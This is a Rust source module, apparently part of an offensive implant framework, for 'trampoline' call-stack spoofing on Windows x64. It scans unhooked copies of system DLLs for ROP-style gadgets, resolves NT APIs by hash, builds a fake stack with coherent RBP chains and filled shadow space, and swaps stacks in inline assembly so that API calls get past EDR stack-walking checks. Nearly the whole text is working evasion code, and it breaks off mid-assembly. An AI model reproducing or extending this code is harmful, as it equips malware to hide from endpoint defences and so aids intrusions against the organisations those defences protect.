//! Trampoline-based stack spoofing with multi-frame synthetic call chains.
//!
//! # Problem
//!
//! The existing `spoof_call` / `spoof_call_chain` approaches push fake return
//! addresses onto the *real* stack.  Sophisticated EDR products can detect this
//! by checking:
//!
//! 1. **Frame-pointer consistency**: Windows x64 code compiled with `/O2` often
//!    omits frame pointers (FPO), but the frames pushed by spoof_call don't have
//!    valid FPO metadata, making them stand out during unwind analysis.
//! 2. **Shadow space validity**: The 32-byte shadow store above the return address
//!    should contain saved register values from the *caller* — spoof_call's shadow
//!    space is always zeros, which is suspicious.
//! 3. **Stack region**: The fake frames are on the thread's real stack, but the
//!    RBP chain doesn't form a coherent walk — RBP values point into unrelated
//!    memory or are simply wrong.
//!
//! # Solution
//!
//! This module allocates a **completely separate fake stack** via
//! `NtAllocateVirtualMemory(PAGE_READWRITE)` and constructs a full synthetic
//! call stack on it, including:
//!
//! - Return addresses pointing into legitimate `call reg` / `ret` gadgets found
//!   in **clean-mapped** system DLLs (ntdll, kernelbase, kernel32, user32).
//! - A valid RBP chain (each frame's RBP points to the previous frame's RBP slot).
//! - Windows x64 ABI shadow space (32 bytes per frame) filled with plausible
//!   values (small integers, not all zeros).
//! - Stack canary values at the end of the chain.
//!
//! When `execute_via_trampoline` is called, it:
//!
//! 1. Switches RSP/RBP to point into the fake stack.
//! 2. Jumps to the API target through the gadget chain.
//! 3. On return, restores the original RSP/RBP.
//! 4. Frees the fake stack.
//!
//! # Trampoline construction algorithm
//!
//! ```text
//! build_trampoline_chain(target, num_frames):
//!   1. Scan clean-mapped DLLs for gadgets:
//!      - call rax   (FF D0)   — dispatching to the target
//!      - call r10   (41 FF D2) — Windows syscall dispatcher
//!      - ret        (C3)       — natural return points
//!      - add rsp,N; ret       — stack cleanup + return
//!      - mov [rsp+8],rbx; ...; ret — function prologue patterns
//!
//!   2. Pick a legitimate export from a system DLL as the "entry point"
//!      (e.g. WaitForSingleObject in kernel32).
//!
//!   3. Chain 3–6 intermediate gadgets from different DLLs:
//!      frame[0] → gadget in ntdll
//!      frame[1] → gadget in kernel32
//!      frame[2] → gadget in kernelbase
//!      ...
//!      frame[N-1] → call rax gadget (dispatches to target)
//!
//!   4. Each frame gets:
//!      - Return address → gadget address
//!      - Saved RBP → previous frame's RBP slot address
//!      - 32-byte shadow space → plausible values
//!      - Local variable space → small integers / zeros
//!
//!   5. Install the chain on a freshly allocated fake stack.
//!
//!   6. Execute: swap stacks → call through chain → swap back.
//! ```
//!
//! # Thread safety
//!
//! Each `build_trampoline_chain` call produces an independent
//! `TrampolineContext` with its own allocated stack.  Multiple threads can
//! construct and use independent chains simultaneously without synchronization.
//!
//! # Feature gating
//!
//! Gated behind `#[cfg(all(windows, feature = "trampoline-spoof", target_arch = "x86_64"))]`.
//! When disabled, callers fall back to `spoof_call` / `spoof_call_chain`.

#![cfg(all(windows, feature = "trampoline-spoof", target_arch = "x86_64"))]

use common::lock::MutexExt;
use std::sync::{Mutex, OnceLock};

// ── Constants ───────────────────────────────────────────────────────────────

/// Size of the fake stack allocation (64 KB — one page guard's worth).
const FAKE_STACK_SIZE: usize = 64 * 1024;

/// Size of the XChaCha20-Poly1305 nonce.
const NONCE_LEN: usize = 24;

/// Size of the XChaCha20-Poly1305 authentication tag.
const TAG_LEN: usize = 16;

/// Number of TLS slots to scan.
const TLS_SLOT_COUNT: usize = 64;

/// Windows x64 ABI shadow space size (4 × 8 bytes = 32 bytes).
const SHADOW_SPACE_SIZE: usize = 32;

/// Alignment requirement for stack frames (16 bytes, per Windows x64 ABI).
const FRAME_ALIGN: usize = 16;

/// Windows PAGE_READWRITE protection constant.
const PAGE_READWRITE: u32 = 0x04;

/// Minimum number of frames in a trampoline chain.
const MIN_FRAMES: usize = 3;

/// Maximum number of frames in a trampoline chain.
const MAX_FRAMES: usize = 6;

/// Target number of frames (default).
const DEFAULT_NUM_FRAMES: usize = 5;

/// DLLs to scan for gadgets, in preference order.
/// We use clean-mapped copies to avoid hook interference.
const SCAN_DLLS: &[&str] = &[
    "ntdll.dll",
    "kernelbase.dll",
    "kernel32.dll",
    "user32.dll",
    "msvcrt.dll",
];

// ── Gadget patterns ─────────────────────────────────────────────────────────

/// A gadget pattern to search for in clean-mapped DLLs.
#[derive(Clone, Copy, Debug)]
pub struct GadgetPattern {
    /// The byte sequence to match.
    pub bytes: &'static [u8],
    /// Human-readable description of the instruction.
    pub description: &'static str,
    /// The kind of gadget — determines how it's used in the chain.
    pub kind: GadgetKind,
}

/// What role a gadget plays in the trampoline chain.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum GadgetKind {
    /// `call rax/r10` — dispatches to the next target. Pushes a return address.
    CallReg,
    /// `ret` — natural return. Pops the next return address.
    Ret,
    /// `add rsp, N; ret` — stack cleanup + return.  Pops the next frame.
    StackCleanupRet,
    /// `mov [rsp+8], rbx; ... ; ret` — function prologue pattern.
    PrologueRet,
}

/// Byte patterns for x86-64 gadgets we search for in clean-mapped DLLs.
///
/// These patterns represent legitimate instructions commonly found in system
/// DLL code.  Each is verified to have valid RUNTIME_FUNCTION unwind metadata
/// before being used in a trampoline chain.
static GADGET_PATTERNS: &[GadgetPattern] = &[
    // `call rax` (FF D0) — most common indirect call, used for dispatching
    GadgetPattern {
        bytes: &[0xFF, 0xD0],
        description: "call rax",
        kind: GadgetKind::CallReg,
    },
    // `call r10` (41 FF D2) — Windows syscall dispatcher pattern
    GadgetPattern {
        bytes: &[0x41, 0xFF, 0xD2],
        description: "call r10",
        kind: GadgetKind::CallReg,
    },
    // `call rcx` (FF D1)
    GadgetPattern {
        bytes: &[0xFF, 0xD1],
        description: "call rcx",
        kind: GadgetKind::CallReg,
    },
    // `ret` (C3) — single-byte return
    GadgetPattern {
        bytes: &[0xC3],
        description: "ret",
        kind: GadgetKind::Ret,
    },
    // `ret N` (C2 xx 00) — return with stack cleanup (rare but valid)
    // We match `ret` followed by any byte — the 2-byte variant C2 XX
    // where XX is the stack pop amount.  Only use 2-byte matches.
    GadgetPattern {
        bytes: &[0xC2, 0x00, 0x00], // ret 0 — equivalent to ret but 3 bytes
        description: "ret 0",
        kind: GadgetKind::Ret,
    },
    // `add rsp, 0x28; ret` — very common in Windows x64 DLLs for
    // __chkstk and similar functions that clean up 0x28 bytes of stack.
    GadgetPattern {
        bytes: &[0x48, 0x83, 0xC4, 0x28, 0xC3],
        description: "add rsp, 0x28; ret",
        kind: GadgetKind::StackCleanupRet,
    },
    // `add rsp, 0x38; ret`
    GadgetPattern {
        bytes: &[0x48, 0x83, 0xC4, 0x38, 0xC3],
        description: "add rsp, 0x38; ret",
        kind: GadgetKind::StackCleanupRet,
    },
    // `add rsp, 0x48; ret`
    GadgetPattern {
        bytes: &[0x48, 0x83, 0xC4, 0x48, 0xC3],
        description: "add rsp, 0x48; ret",
        kind: GadgetKind::StackCleanupRet,
    },
    // `add rsp, 0x58; ret`
    GadgetPattern {
        bytes: &[0x48, 0x83, 0xC4, 0x58, 0xC3],
        description: "add rsp, 0x58; ret",
        kind: GadgetKind::StackCleanupRet,
    },
    // `add rsp, 0x20; ret` — common small-cleanup variant
    GadgetPattern {
        bytes: &[0x48, 0x83, 0xC4, 0x20, 0xC3],
        description: "add rsp, 0x20; ret",
        kind: GadgetKind::StackCleanupRet,
    },
    // `add rsp, 0x18; ret`
    GadgetPattern {
        bytes: &[0x48, 0x83, 0xC4, 0x18, 0xC3],
        description: "add rsp, 0x18; ret",
        kind: GadgetKind::StackCleanupRet,
    },
];

// ── TrampolineGadget ────────────────────────────────────────────────────────

/// A legitimate code gadget found in a clean-mapped system DLL.
///
/// Each gadget represents a real instruction sequence inside a system module
/// that can be used as a return address in the synthetic call chain.  Because
/// the gadget is inside a real DLL function, it has valid unwind metadata and
/// will pass EDR stack-walking validation.
#[derive(Clone, Debug)]
pub struct TrampolineGadget {
    /// The address of the gadget instruction.
    pub addr: usize,
    /// The size of the gadget in bytes.
    pub size: usize,
    /// The name of the source module (e.g. "ntdll.dll").
    pub source_module: String,
    /// The raw bytes of the gadget instruction (for verification).
    pub instruction_bytes: Vec<u8>,
    /// The kind of gadget (CallReg, Ret, StackCleanupRet, PrologueRet).
    pub kind: GadgetKind,
}

// ── TrampolineContext ───────────────────────────────────────────────────────

/// Context for an active trampoline stack, holding the fake stack allocation
/// and the chain of gadgets.
///
/// Dropping this struct frees the fake stack via `NtFreeVirtualMemory` and
/// zeroises any residual data.
pub struct TrampolineContext {
    /// Base address of the allocated fake stack region.
    stack_base: usize,
    /// Size of the fake stack region in bytes.
    stack_size: usize,
    /// The current RSP value within the fake stack (where the call chain starts).
    rsp_value: usize,
    /// The current RBP value within the fake stack (top of the RBP chain).
    rbp_value: usize,
    /// The chain of gadgets used to build this trampoline.
    chain: Vec<TrampolineGadget>,
    /// Saved original RSP (restored after execution).
    original_rsp: usize,
    /// Saved original RBP (restored after execution).
    original_rbp: usize,
}

impl Drop for TrampolineContext {
    fn drop(&mut self) {
        // Zero out the fake stack before freeing.
        if self.stack_base != 0 && self.stack_size > 0 {
            unsafe {
                std::ptr::write_bytes(self.stack_base as *mut u8, 0, self.stack_size);
            }
            // Free via NtFreeVirtualMemory.
            free_virtual_memory(self.stack_base, self.stack_size);
        }
    }
}

// ── Gadget cache ────────────────────────────────────────────────────────────

/// Cached pool of trampoline gadgets found in clean-mapped system DLLs.
static GADGET_CACHE: OnceLock<Mutex<Vec<TrampolineGadget>>> = OnceLock::new();

// ── Pseudo-random chain selection ───────────────────────────────────────────

/// Simple xorshift64 PRNG for chain diversity.
static CHAIN_SELECT_STATE: std::sync::atomic::AtomicU64 =
    std::sync::atomic::AtomicU64::new(0xDEAD_BEEF_CAFE_1337);

/// Return a pseudo-random index in [0, n).
fn rand_index(n: usize) -> usize {
    if n == 0 {
        return 0;
    }
    use std::sync::atomic::Ordering;
    let mut state = CHAIN_SELECT_STATE.load(Ordering::Relaxed);
    state ^= state << 13;
    state ^= state >> 7;
    state ^= state << 17;
    CHAIN_SELECT_STATE.store(state, Ordering::Relaxed);
    (state as usize) % n
}

// ── NT API resolution ───────────────────────────────────────────────────────

/// Resolve `NtAllocateVirtualMemory` from ntdll.
fn resolve_nt_allocate_virtual_memory() -> Option<usize> {
    let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)? };
    let hash = pe_resolve::hash_str(b"NtAllocateVirtualMemory\0");
    unsafe { pe_resolve::get_proc_address_by_hash(ntdll, hash) }
}

/// Resolve `NtFreeVirtualMemory` from ntdll.
fn resolve_nt_free_virtual_memory() -> Option<usize> {
    let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)? };
    let hash = pe_resolve::hash_str(b"NtFreeVirtualMemory\0");
    unsafe { pe_resolve::get_proc_address_by_hash(ntdll, hash) }
}

/// Resolve `RtlLookupFunctionEntry` from ntdll.
fn resolve_rtl_lookup_function_entry() -> Option<usize> {
    let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)? };
    let hash = pe_resolve::hash_str(b"RtlLookupFunctionEntry\0");
    unsafe { pe_resolve::get_proc_address_by_hash(ntdll, hash) }
}

// ── Memory allocation via NT syscalls ───────────────────────────────────────

/// Allocate a memory region using `NtAllocateVirtualMemory`.
///
/// Uses the current process handle (-1) and allocates `PAGE_READWRITE` memory.
/// Returns the base address on success.
fn allocate_virtual_memory(size: usize) -> Option<usize> {
    let func_addr = resolve_nt_allocate_virtual_memory()?;
    let mut base: usize = 0;
    let mut region_size: usize = size;
    let base_ptr: *mut usize = &mut base;
    let size_ptr: *mut usize = &mut region_size;

    // NtAllocateVirtualMemory(
    //   ProcessHandle: HANDLE,        // rcx = -1 (current process)
    //   BaseAddress: *PVOID,          // rdx
    //   ZeroBits: ULONG,              // r8 = 0
    //   RegionSize: *SIZE_T,          // r9
    //   AllocationType: ULONG,        // [rsp+0x28] = MEM_COMMIT|MEM_RESERVE (0x3000)
    //   Protect: ULONG                // [rsp+0x30] = PAGE_READWRITE (0x04)
    // ) -> NTSTATUS
    type NtAllocateVirtualMemoryFn =
        unsafe extern "system" fn(usize, *mut usize, usize, *mut usize, u32, u32) -> i32;

    let func: NtAllocateVirtualMemoryFn = unsafe { std::mem::transmute(func_addr) };

    let status = unsafe {
        func(
            (-1isize) as usize, // Current process
            base_ptr,
            0, // ZeroBits
            size_ptr,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            PAGE_READWRITE,
        )
    };

    if status >= 0 {
        Some(base)
    } else {
        tracing::warn!("trampoline_spoof: NtAllocateVirtualMemory failed with status {status:#x}");
        None
    }
}

/// Free a memory region using `NtFreeVirtualMemory`.
fn free_virtual_memory(base: usize, size: usize) {
    let func_addr = match resolve_nt_free_virtual_memory() {
        Some(a) => a,
        None => {
            tracing::warn!("trampoline_spoof: could not resolve NtFreeVirtualMemory");
            return;
        }
    };

    let mut base_addr: usize = base;
    let mut region_size: usize = size;
    let base_ptr: *mut usize = &mut base_addr;
    let size_ptr: *mut usize = &mut region_size;

    // NtFreeVirtualMemory(
    //   ProcessHandle: HANDLE,    // rcx = -1
    //   BaseAddress: *PVOID,      // rdx
    //   RegionSize: *SIZE_T,      // r8
    //   FreeType: ULONG           // r9 = MEM_RELEASE (0x8000)
    // ) -> NTSTATUS
    type NtFreeVirtualMemoryFn =
        unsafe extern "system" fn(usize, *mut usize, *mut usize, u32) -> i32;

    let func: NtFreeVirtualMemoryFn = unsafe { std::mem::transmute(func_addr) };

    let status = unsafe {
        func(
            (-1isize) as usize,
            base_ptr,
            size_ptr,
            0x8000, // MEM_RELEASE
        )
    };

    if status < 0 {
        tracing::warn!("trampoline_spoof: NtFreeVirtualMemory failed with status {status:#x}");
    }
}

// ── Unwind metadata validation ──────────────────────────────────────────────

/// Check if `addr` has a valid RUNTIME_FUNCTION entry (valid unwind metadata).
fn has_valid_unwind(addr: usize) -> bool {
    let lookup_fn = match resolve_rtl_lookup_function_entry() {
        Some(f) => f,
        None => return false,
    };
    unsafe {
        type LookupFn = unsafe extern "system" fn(u64, *mut u64, usize) -> usize;
        let func: LookupFn = std::mem::transmute(lookup_fn);
        let mut image_base: u64 = 0;
        func(addr as u64, &mut image_base, 0) != 0
    }
}

// ── PE header helpers ───────────────────────────────────────────────────────

/// Read the SizeOfImage from a PE image at `base`.
unsafe fn pe_size_of_image(base: usize) -> usize {
    let e_lfanew = *((base + 0x3C) as *const u32) as usize;
    let opt_header = base + e_lfanew + 0x18;
    *((opt_header + 0x38) as *const u32) as usize
}

// ── Gadget scanning ─────────────────────────────────────────────────────────

/// Scan a clean-mapped DLL for trampoline gadgets.
///
/// Searches the `.text` section for the byte patterns defined in
/// `GADGET_PATTERNS`.  Each found gadget is validated for:
///
/// 1. Valid RUNTIME_FUNCTION unwind metadata (via `RtlLookupFunctionEntry`).
/// 2. The gadget instruction is still intact (re-read and verify bytes).
///
/// Returns a list of valid trampoline gadgets found in the DLL.
fn scan_dll_for_gadgets(dll_base: usize, dll_name: &str) -> Vec<TrampolineGadget> {
    let size = unsafe { pe_size_of_image(dll_base) };
    if size == 0 || size > 64 * 1024 * 1024 {
        return Vec::new();
    }

    let code = unsafe { std::slice::from_raw_parts(dll_base as *const u8, size) };
    let mut gadgets = Vec::new();

    for pattern in GADGET_PATTERNS.iter() {
        let pat_len = pattern.bytes.len();
        let limit = size.saturating_sub(pat_len);

        for i in 0..limit {
            if !code[i..].starts_with(pattern.bytes) {
                continue;
            }

            let candidate = dll_base + i;

            // Verify unwind metadata.
            if !has_valid_unwind(candidate) {
                continue;
            }

            // Read back the bytes for verification.
            let mut instruction_bytes = vec![0u8; pat_len];
            unsafe {
                std::ptr::copy_nonoverlapping(
                    candidate as *const u8,
                    instruction_bytes.as_mut_ptr(),
                    pat_len,
                );
            }

            gadgets.push(TrampolineGadget {
                addr: candidate,
                size: pat_len,
                source_module: dll_name.to_string(),
                instruction_bytes,
                kind: pattern.kind,
            });

            // Limit per-pattern hits to keep the cache manageable.
            let count = gadgets.iter().filter(|g| g.kind == pattern.kind).count();
            if count >= 32 {
                break;
            }
        }
    }

    gadgets
}

/// Populate the gadget cache by scanning all target DLLs.
///
/// Uses clean-mapped copies (via `syscalls::map_clean_dll`) to avoid
/// hook interference.  Clean-mapped DLLs have the same code layout as
/// the on-disk originals, so gadget offsets are consistent with the
/// loaded modules that EDR sees.
fn populate_gadget_cache() -> Vec<TrampolineGadget> {
    let mut all_gadgets = Vec::new();

    for &dll_name in SCAN_DLLS {
        // Use clean-mapped DLL to avoid hooks.
        let dll_base = match crate::syscalls::map_clean_dll(dll_name) {
            Ok(base) => base,
            Err(_) => {
                // Fallback: try PEB walking for the loaded module.
                let dll_lower = dll_name.to_lowercase();
                let dll_wide: Vec<u16> =
                    dll_lower.encode_utf16().chain(std::iter::once(0)).collect();
                let hash = pe_resolve::hash_wstr(&dll_wide[..dll_wide.len() - 1]);
                match unsafe { pe_resolve::get_module_handle_by_hash(hash) } {
                    Some(b) if b != 0 => b,
                    _ => continue,
                }
            }
        };

        let gadgets = scan_dll_for_gadgets(dll_base, dll_name);
        tracing::debug!(
            "trampoline_spoof: found {} gadgets in {}",
            gadgets.len(),
            dll_name,
        );
        all_gadgets.extend(gadgets);
    }

    tracing::debug!(
        "trampoline_spoof: total {} gadgets across {} DLLs",
        all_gadgets.len(),
        SCAN_DLLS.len(),
    );

    all_gadgets
}

/// Ensure the gadget cache is populated.  Returns a locked reference.
fn ensure_gadgets() -> &'static Mutex<Vec<TrampolineGadget>> {
    GADGET_CACHE.get_or_init(|| Mutex::new(populate_gadget_cache()))
}

// ── Frame layout helpers ────────────────────────────────────────────────────

/// Calculate the size of a single synthetic stack frame in bytes.
///
/// Each frame contains:
///   - 8 bytes: return address (the gadget address)
///   - 8 bytes: saved RBP (pointer to previous frame's RBP slot)
///   - 32 bytes: shadow space (4 × 8-byte register saves)
///   - 16 bytes: "local variables" (2 × 8-byte plausible values)
///
/// Total: 64 bytes per frame, which is 16-byte aligned.
const fn frame_size() -> usize {
    8 + 8 + SHADOW_SPACE_SIZE + 16
}

/// Build a single frame on the fake stack.
///
/// Writes the following layout at `rsp`:
///
/// ```text
/// [rsp +  0]  return_addr    (8 bytes) — gadget address
/// [rsp +  8]  saved_rbp      (8 bytes) — pointer to previous frame's RBP slot
/// [rsp + 16]  shadow[0]      (8 bytes) — plausible saved register value
/// [rsp + 24]  shadow[1]      (8 bytes) — plausible saved register value
/// [rsp + 32]  shadow[2]      (8 bytes) — plausible saved register value
/// [rsp + 40]  shadow[3]      (8 bytes) — plausible saved register value
/// [rsp + 48]  local[0]       (8 bytes) — plausible local variable
/// [rsp + 56]  local[1]       (8 bytes) — plausible local variable / canary
/// ```
unsafe fn write_frame(rsp: usize, return_addr: usize, saved_rbp: usize, frame_index: usize) {
    let ptr = rsp as *mut u64;

    // Return address (gadget)
    *ptr.add(0) = return_addr as u64;

    // Saved RBP (frame pointer chain)
    *ptr.add(1) = saved_rbp as u64;

    // Shadow space — fill with plausible saved register values.
    // Use small non-zero integers that look like saved registers.
    // R12-R15 are commonly saved here in real code.
    *ptr.add(2) = (frame_index as u64 + 1) << 4; // looks like a saved R12
    *ptr.add(3) = (frame_index as u64 + 3) << 8; // looks like a saved R13
    *ptr.add(4) = (frame_index as u64 + 5) << 12; // looks like a saved R14
    *ptr.add(5) = (frame_index as u64 + 7) << 4; // looks like a saved R15

    // "Local variables" — small integers / canary values.
    *ptr.add(6) = (frame_index as u64) * 0x100 + 0x42; // plausible status code
    *ptr.add(7) = 0xDEAD_BEEF; // stack canary
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Search clean-mapped DLLs for gadgets matching the defined patterns.
///
/// Scans ntdll, kernelbase, kernel32, user32, and msvcrt for the byte
/// patterns in `GADGET_PATTERNS`.  Each gadget is validated for valid
/// RUNTIME_FUNCTION unwind metadata before being added to the result.
///
/// # Returns
///
/// A vector of `TrampolineGadget` instances, one for each valid gadget found.
/// Gadgets are grouped by source module.
pub fn find_call_gadgets(dll_base: usize, dll_name: &str) -> Vec<TrampolineGadget> {
    scan_dll_for_gadgets(dll_base, dll_name)
}

/// Construct a trampoline chain that routes execution through legitimate
/// system DLL gadgets.
///
/// The chain starts from a legitimate export in a system DLL (e.g.
/// WaitForSingleObject in kernel32) and chains through 3–6 intermediate
/// gadgets in different DLLs before reaching the target address.
///
/// Each intermediate gadget appears as a legitimate call frame in the
/// synthetic stack, with:
/// - Return addresses inside real DLL functions with valid unwind metadata
/// - A coherent RBP chain
/// - Proper shadow space
///
/// # Arguments
///
/// * `target_addr` — The final target address (the API function to call).
/// * `num_frames`  — Number of frames in the chain (clamped to 3–6).
///
/// # Returns
///
/// `Ok(Vec<TrampolineGadget>)` on success, containing the gadget chain from
/// innermost (closest to the target) to outermost.
pub fn build_trampoline_chain(
    target_addr: usize,
    num_frames: usize,
) -> Result<Vec<TrampolineGadget>, anyhow::Error> {
    let num_frames = num_frames.clamp(MIN_FRAMES, MAX_FRAMES);

    let gadgets = ensure_gadgets().lock_recover();
    if gadgets.is_empty() {
        return Err(anyhow::anyhow!(
            "trampoline_spoof: no gadgets available for chain construction"
        ));
    }

    // Separate gadgets by kind for chain construction.
    // Clone them so we can release the lock before building the chain.
    let call_gadgets: Vec<TrampolineGadget> = gadgets
        .iter()
        .filter(|g| g.kind == GadgetKind::CallReg)
        .cloned()
        .collect();
    let ret_gadgets: Vec<TrampolineGadget> = gadgets
        .iter()
        .filter(|g| g.kind == GadgetKind::Ret || g.kind == GadgetKind::StackCleanupRet)
        .cloned()
        .collect();

    if call_gadgets.is_empty() {
        return Err(anyhow::anyhow!(
            "trampoline_spoof: no call gadgets available"
        ));
    }
    if ret_gadgets.is_empty() {
        return Err(anyhow::anyhow!(
            "trampoline_spoof: no ret gadgets available"
        ));
    }
    drop(gadgets);

    let mut chain = Vec::with_capacity(num_frames);

    // Build the chain from outermost (top of stack) to innermost (closest to
    // the target).  The last gadget must be a `call reg` that dispatches to
    // the target; the intermediate gadgets are `ret` / `add rsp, N; ret` that
    // form the synthetic frame chain.
    for i in 0..num_frames {
        if i == num_frames - 1 {
            // Innermost frame: use a `call reg` gadget that dispatches to the
            // target function.
            let idx = rand_index(call_gadgets.len());
            chain.push(call_gadgets[idx].clone());
        } else {
            // Intermediate frame: use a `ret` or `add rsp, N; ret` gadget.
            // Prefer gadgets from different modules for diversity.
            let idx = rand_index(ret_gadgets.len());
            chain.push(ret_gadgets[idx].clone());
        }
    }

    // Try to ensure gadgets come from different modules for realism.
    // Sort so that no two adjacent gadgets are from the same module.
    let mut diversified = false;
    for _attempt in 0..10 {
        let mut needs_swap = false;
        for i in 1..chain.len() {
            if chain[i].source_module == chain[i - 1].source_module {
                needs_swap = true;
                break;
            }
        }
        if !needs_swap {
            diversified = true;
            break;
        }
        // Shuffle and retry (simple: swap a random pair).
        let i = rand_index(chain.len());
        let j = rand_index(chain.len());
        if i != j {
            chain.swap(i, j);
        }
    }

    if !diversified {
        tracing::debug!(
            "trampoline_spoof: chain has some adjacent same-module frames (acceptable)"
        );
    }

    tracing::debug!(
        "trampoline_spoof: built chain with {} frames for target {:#x}: {:?}",
        chain.len(),
        target_addr,
        chain
            .iter()
            .map(|g| format!("{:#x} ({})", g.addr, g.source_module))
            .collect::<Vec<_>>(),
    );

    Ok(chain)
}

/// Allocate and populate a fake stack with the trampoline chain.
///
/// Creates a `PAGE_READWRITE` memory region via `NtAllocateVirtualMemory`
/// and writes the synthetic call chain frames onto it.  The chain includes:
///
/// - Return addresses from the trampoline gadgets
/// - A valid RBP chain (each frame's RBP points to the previous frame)
/// - Shadow space with plausible saved register values
/// - Stack canary values
///
/// # Arguments
///
/// * `chain` — The trampoline gadget chain from `build_trampoline_chain`.
///
/// # Returns
///
/// `Ok(TrampolineContext)` containing the fake stack and chain metadata.
/// The context must be passed to `execute_via_trampoline` or cleaned up
/// via `cleanup_trampoline`.
pub fn install_trampoline_stack(
    chain: &[TrampolineGadget],
) -> Result<TrampolineContext, anyhow::Error> {
    if chain.is_empty() {
        return Err(anyhow::anyhow!(
            "trampoline_spoof: cannot install empty chain"
        ));
    }

    let n_frames = chain.len();
    let fsz = frame_size();

    // Allocate the fake stack.
    let stack_base = allocate_virtual_memory(FAKE_STACK_SIZE)
        .ok_or_else(|| anyhow::anyhow!("trampoline_spoof: failed to allocate fake stack"))?;

    // Build frames from the top (highest address) down, matching x64 stack
    // growth direction.  The "top" of the stack is at the highest address;
    // the first frame to be "called" (innermost) is at the bottom.
    //
    // Layout (low → high):
    //   [frame N-1]  innermost frame (call reg gadget → target)
    //   [frame N-2]
    //   ...
    //   [frame 1]
    //   [frame 0]    outermost frame (first to appear in stack walk)
    //
    // RSP points to frame 0's return-address slot after setup.
    // The RBP chain links from frame 0 → frame 1 → ... → frame N-1.

    // Place frames near the *top* of the allocated region (leave room for
    // the initial call's arguments and shadow space below).
    let frames_start = stack_base + FAKE_STACK_SIZE - (n_frames * fsz);

    // Write each frame.
    // frame[0] is outermost (farthest from the target in the call graph).
    // chain[0] is the outermost gadget, chain[N-1] is the innermost (call reg).
    //
    // On the stack, we place chain[N-1] at the lowest address (it executes
    // first — it's the `call reg` that dispatches to the target), and
    // chain[0] at the highest address.
    let mut prev_rbp: usize = 0; // no previous frame for the outermost

    for i in 0..n_frames {
        // Reverse: chain[i] maps to stack position (n_frames - 1 - i).
        // This way chain[N-1] (the call reg gadget) is at the bottom of
        // the stack — it executes first.
        let stack_idx = n_frames - 1 - i;
        let frame_rsp = frames_start + stack_idx * fsz;

        // The return address for this frame is the gadget address.
        let ret_addr = chain[i].addr;

        // Saved RBP: for frame 0 (outermost), use 0 (end of chain).
        // For subsequent frames, point to the previous frame's RBP slot.
        let saved_rbp = if i == 0 {
            0 // outermost — terminate the RBP chain
        } else {
            // Previous frame in the chain is (i-1), which is at
            // stack position (n_frames - 1 - (i-1)) = (n_frames - i).
            let prev_stack_idx = n_frames - i;
            frames_start + prev_stack_idx * fsz + 8 // +8 = offset of saved_rbp slot
        };

        unsafe {
            write_frame(frame_rsp, ret_addr, saved_rbp, i);
        }

        if i == 0 {
            // This is the outermost frame.  RSP will point here.
            // The RBP chain starts at this frame's saved_rbp slot.
            prev_rbp = frame_rsp + 8;
        }
    }

    // RSP points to the outermost frame's return-address slot.
    // That's the frame at the *highest* address (stack position 0, chain index 0).
    let rsp_value = frames_start + (n_frames - 1) * fsz;
    let rbp_value = frames_start + (n_frames - 1) * fsz + 8;

    // Verify alignment: RSP must be 16-byte aligned before a CALL instruction.
    // If not, subtract 8 to align.
    let rsp_value = if rsp_value % FRAME_ALIGN != 0 {
        rsp_value - 8
    } else {
        rsp_value
    };

    tracing::debug!(
        "trampoline_spoof: installed fake stack at {:#x}, RSP={:#x}, RBP={:#x}, {} frames",
        stack_base,
        rsp_value,
        rbp_value,
        n_frames,
    );

    Ok(TrampolineContext {
        stack_base,
        stack_size: FAKE_STACK_SIZE,
        rsp_value,
        rbp_value,
        chain: chain.to_vec(),
        original_rsp: 0, // filled in by execute_via_trampoline
        original_rbp: 0,
    })
}

/// Execute a function through the trampoline chain.
///
/// This function:
/// 1. Installs the trampoline stack (swaps RSP/RBP)
/// 2. Calls the target function through the gadget chain
/// 3. Restores the original stack
/// 4. Returns the function result
///
/// # Safety
///
/// The caller must ensure that:
/// - `target_addr` is a valid function address
/// - `args` are valid for the target function
/// - No other code is manipulating the current thread's stack
///
/// # Arguments
///
/// * `target_addr` — The function to call.
/// * `args` — Arguments to pass (first 4 in registers, rest on stack).
///
/// # Returns
///
/// The return value from the target function as a `u64`.
pub unsafe fn execute_via_trampoline(
    target_addr: usize,
    args: &[u64],
) -> Result<u64, anyhow::Error> {
    // Build the trampoline chain.
    let num_frames = DEFAULT_NUM_FRAMES;
    let chain = build_trampoline_chain(target_addr, num_frames)?;

    // Install the fake stack.
    let mut ctx = install_trampoline_stack(&chain)?;

    // Split args into register args and stack args.
    let arg1 = args.get(0).copied().unwrap_or(0);
    let arg2 = args.get(1).copied().unwrap_or(0);
    let arg3 = args.get(2).copied().unwrap_or(0);
    let arg4 = args.get(3).copied().unwrap_or(0);
    let stack_args = if args.len() > 4 { &args[4..] } else { &[] };

    let nstack = stack_args.len();
    let stack_ptr = stack_args.as_ptr();

    // The innermost gadget (last in chain) should be a `call reg` that
    // dispatches to the target.  We'll use inline asm to:
    // 1. Save current RSP/RBP
    // 2. Switch to fake stack
    // 3. Jump through the chain to the target
    // 4. On return, restore original stack
    let fake_rsp = ctx.rsp_value;
    let innermost_gadget = chain.last().map(|g| g.addr).unwrap_or(0);

    let status: u64;

    std::arch::asm!(
        // Save callee-saved registers.
        "push rbx",
        "push rsi",
        "push rdi",
        "push r14",
        "push r15",

        // Save original RSP and RBP.
        "mov r14, rsp",
        "mov r15, rbp",

        // Switch to the fake stack.
        "mov rsp, {fake_rsp}",

        // Allocate shadow space + stack args on the fake stack, aligned.
        "mov rax, {nstack}",
        "shl rax, 3",
        "add rax, 0x28 + 15",
        "and rax, -16",
        "sub rsp, rax",

        // Copy stack arguments.
        "test {nstack}, {nstack}",
        "jz 41f",
        "mov rcx, {nstack}",
        "mov rsi, {stack_ptr}",
        "lea rdi, [rsp + 0x28]",
        "cld",
        "rep movsq",

        "41:",
        // Load register arguments per Windows x64 ABI.
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",

        // Jump to the target through the chain's innermost gadget.
        // The innermost gadget is a `call reg` (e.g., call rax).
        // Set rax to the target address, then jump to the gadget.
        "mov rax, {target}",
        "mov r11, {gadget}",
        "jmp r11",

        // ── Continuation: after all frames unwind back here ────────────
